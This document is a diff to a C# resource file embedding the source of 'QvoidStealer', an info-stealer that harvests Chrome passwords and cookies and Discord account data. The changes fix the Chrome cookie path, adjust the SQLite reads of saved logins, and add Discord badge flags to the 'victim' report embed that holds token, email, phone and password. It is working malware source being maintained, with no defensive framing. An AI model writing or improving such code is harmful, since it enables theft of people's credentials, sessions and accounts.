@@ -117,7 +117,7 @@
   <resheader name="writer">
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
-  <data name="Source" xml:space="preserve">
+<data name="Source" xml:space="preserve">
     <value>using System;
 using System.IO;
 using System.Net;
@@ -379,7 +379,7 @@ namespace QvoidStealer.Main
 
                 //Grabbing passwords and cookies
                 var _Chrome = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
-                    "\\Google\\Chrome\\User Data\\Default\\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
+                    "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                     "\\Google\\Chrome\\User Data\\Local State", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                     "\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome");
 
@@ -469,6 +469,7 @@ namespace QvoidStealer.Main
                                       $"Phone Number: {(String.IsNullOrEmpty(curUser.Phone) ? "None" : curUser.Phone)}{Environment.NewLine}" +
                                       $"Premium: {curUser.Premium}{Environment.NewLine}" +
                                       $"Verified: {curUser.Verified}{Environment.NewLine}" +
+                                      $"Badges: {string.Join(", ", curUser.GetBadges)}{Environment.NewLine}" +
                                       $"Created At: {curUser.CreatedAt.DateTime.ToShortDateString()} | {curUser.CreatedAt.DateTime.ToShortTimeString()}{Environment.NewLine}";
 
                     if (_Token == curUser.Token)
@@ -484,6 +485,7 @@ namespace QvoidStealer.Main
                         victimEmbed.Fields.Add(new EmbedField() { Name = "Verified", Value = $"```{curUser.Verified}```", InLine = true });
                         victimEmbed.Fields.Add(new EmbedField() { Name = "Created At", Value = $"```{curUser.CreatedAt}```", InLine = true });
                         victimEmbed.Fields.Add(new EmbedField() { Name = "Phone Number", Value = $"```{(String.IsNullOrEmpty(curUser.Phone) ? "None" : curUser.Phone)}{Environment.NewLine}```", InLine = true });
+                        victimEmbed.Fields.Add(new EmbedField() { Name = "Badges", Value = $"```{(curUser.GetBadges.Count &lt;= 0 ? "None" : string.Join(", ", curUser.GetBadges))}{Environment.NewLine}```", InLine = true });
 
                         if (!String.IsNullOrEmpty(_OldPassword))
                         {
@@ -1636,7 +1638,7 @@ namespace QvoidStealer.Miscellaneous.Stealers.Browsers
 
                 if (File.Exists(KeyPath) &amp;&amp; File.Exists(p))
                 {
-                    using (var conn = new SQLiteConnection($"Data Source={p};"))
+                    using (var conn = new SQLiteConnection($"Data Source={p};pooling=false"))
                     {
                         conn.Open();
                         using (var cmd = conn.CreateCommand())
@@ -1644,7 +1646,6 @@ namespace QvoidStealer.Miscellaneous.Stealers.Browsers
                             cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                             using (var reader = cmd.ExecuteReader())
                             {
-
                                 if (reader.HasRows)
                                 {
                                     var key = ChromiumDecryptor.GetKey(KeyPath);
@@ -1713,7 +1714,12 @@ namespace QvoidStealer.Miscellaneous.Stealers.Browsers
             try
             {
                 List&lt;CookieModel&gt; cookies = new List&lt;CookieModel&gt;();
-                if (!Directory.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
+                if (CookiePath.Contains("\\Google\\Chrome\\"))
+                {
+                    if (!File.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException 
+                }
+                else
+                    if (!Directory.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
 
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={CookiePath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
@@ -3666,12 +3672,65 @@ namespace QvoidWrapper
         public string Phone { get; private set; }
         public DateTimeOffset CreatedAt { get; private set; }
         public string Token { get; private set; }
+        public int Flags { get; private set; }
+        public List&lt;string&gt; GetBadges
+        {
+            get
+            {
+                var badges = new List&lt;string&gt;();
+                if ((Flags &amp; (int)Badges.Partnered_Server_Owner) == (int)Badges.Partnered_Server_Owner)
+                    badges.Add(Badges.Partnered_Server_Owner.ToString());
+
+                if ((Flags &amp; (int)Badges.Bug_Hunter_Level_2) == (int)Badges.Bug_Hunter_Level_2)
+                    badges.Add(Badges.Bug_Hunter_Level_2.ToString());
+
+                if ((Flags &amp; (int)Badges.Bug_Hunter_Level_1) == (int)Badges.Bug_Hunter_Level_1)
+                    badges.Add(Badges.Bug_Hunter_Level_1.ToString());
+
+                if ((Flags &amp; (int)Badges.Early_Verified_Bot_Developer) == (int)Badges.Early_Verified_Bot_Developer)
+                    badges.Add(Badges.Early_Verified_Bot_Developer.ToString());
+
+                if ((Flags &amp; (int)Badges.Early_Supporter) == (int)Badges.Early_Supporter)
+                    badges.Add(Badges.Early_Supporter.ToString());
+
+                if ((Flags &amp; (int)Badges.Early_Verified_Bot_Developer) == (int)Badges.Early_Verified_Bot_Developer)
+                    badges.Add(Badges.Early_Verified_Bot_Developer.ToString());
+
+                if ((Flags &amp; (int)Badges.House_Balance) == (int)Badges.House_Balance)
+                    badges.Add(Badges.House_Balance.ToString());
+
+                if ((Flags &amp; (int)Badges.House_Bravery) == (int)Badges.House_Bravery)
+                    badges.Add(Badges.House_Bravery.ToString());
+
+                if ((Flags &amp; (int)Badges.House_Brilliance) == (int)Badges.House_Brilliance)
+                    badges.Add(Badges.House_Brilliance.ToString());
+
+                if ((Flags &amp; (int)Badges.Discord_Employee) == (int)Badges.Discord_Employee)
+                    badges.Add(Badges.Discord_Employee.ToString());
+
+                return badges;
+            }
+        }
 
         public enum PremiumType
         {
             None = 0,
             Nitro_Classic = 1,
             Nitro = 2
+        }
+
+        public enum Badges
+        {
+            Discord_Employee = 0x1,
+            Partnered_Server_Owner = 0x2,
+            HypeSquad_Events = 0x4,
+            Bug_Hunter_Level_1 = 0x8,
+            House_Bravery = 0x40,
+            House_Brilliance = 0x80,
+            House_Balance = 0x100,
+            Early_Supporter = 0x200,
+            Bug_Hunter_Level_2 = 0x4000,
+            Early_Verified_Bot_Developer = 0x20000,
         }
 
         public DiscordClient(string token)
@@ -3694,6 +3753,7 @@ namespace QvoidWrapper
                 this.Email = $"{jData["email"]}";
                 this.Banner = $"{jData["banner"]}";
                 this.Phone = $"{jData["phone"]}";
+                this.Flags = int.Parse($"{jData["flags"]}");
                 this.CreatedAt = DateTimeOffset.FromUnixTimeMilliseconds((long)((this.Id &gt;&gt; 22) + 1420070400000UL));
                 this.AccentColor = int.Parse(!String.IsNullOrEmpty($"{jData["accent_color"]}") ? $"{jData["accent_color"]}" : "0");
                 this.Token = token;
